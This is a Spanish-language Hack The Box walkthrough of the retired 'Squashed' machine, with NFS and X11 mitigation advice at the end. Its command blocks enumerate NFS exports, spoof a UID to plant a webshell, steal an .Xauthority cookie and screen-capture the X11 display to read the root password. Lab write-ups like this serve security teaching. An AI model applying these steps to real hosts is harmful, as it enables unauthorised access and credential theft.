---
machine: Squashed
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, nfs, uid-spoofing, x11, xauthority, keepass]
---

# Squashed — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Dos exports NFS confían en el UID del cliente. Suplantando el UID del propietario se escribe un webshell en `/var/www/html` y se obtiene acceso. Después se roba `.Xauthority`, se captura la pantalla X11 y se lee la contraseña de root.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p22,80,111,2049 <IP>
showmount -e <IP>
```

Los exports son `/home/ross` y `/var/www/html`. Se montan en local:

```bash
sudo mount -t nfs <IP>:/var/www/html /mnt/web
sudo mount -t nfs <IP>:/home/ross /mnt/ross
```

## Acceso inicial

El propietario de `/var/www/html` es UID 2017 (usuario `alex`). Se crea un usuario local con ese UID/GID y se escribe un webshell:

```bash
sudo useradd -u 2017 -M fakewww
sudo -u fakewww cp shell.php /mnt/web/shell.php
curl 'http://<IP>/shell.php?c=id'
```

La shell corre como `alex`. También se puede añadir una clave SSH en `/home/alex/.ssh`.

## Movimiento lateral

El home de `ross` pertenece al UID 1001 y es legible tras suplantarlo. Se copia `.Xauthority` y se usa para autenticarse contra el display `:0`.

## Escalada a root

Con la cookie X11 se captura la pantalla del escritorio:

```bash
export XAUTHORITY=/tmp/.Xauthority
xwd -display :0 -root -screen -silent > /tmp/screen.xwd
convert /tmp/screen.xwd /tmp/screen.png
```

La imagen muestra la contraseña de root escrita en el escritorio. Se usa con `su`:

```bash
su root
```

## Evidencia

- `showmount` y montajes NFS.
- UID suplantado y webshell.
- `.Xauthority` y captura X11.
- Contraseña redactada y shell root.

## Lecciones aprendidas

- NFS autentica por UID/GID, no por máquina.
- `no_root_squash` y exports amplios rompen el aislamiento.
- `.Xauthority` permite controlar el display.
- Los secretos visibles en pantalla son evidencia.

## Mitigación y detección

- Exportar NFS solo a hosts y redes de confianza.
- Usar `root_squash` y UID/GID consistentes.
- Restringir X11 y `-nolisten tcp`.
- No mostrar credenciales en el escritorio.

## Referencias

- <https://www.hackthebox.com/machines/squashed>
- <https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting>
- <https://www.x.org/>
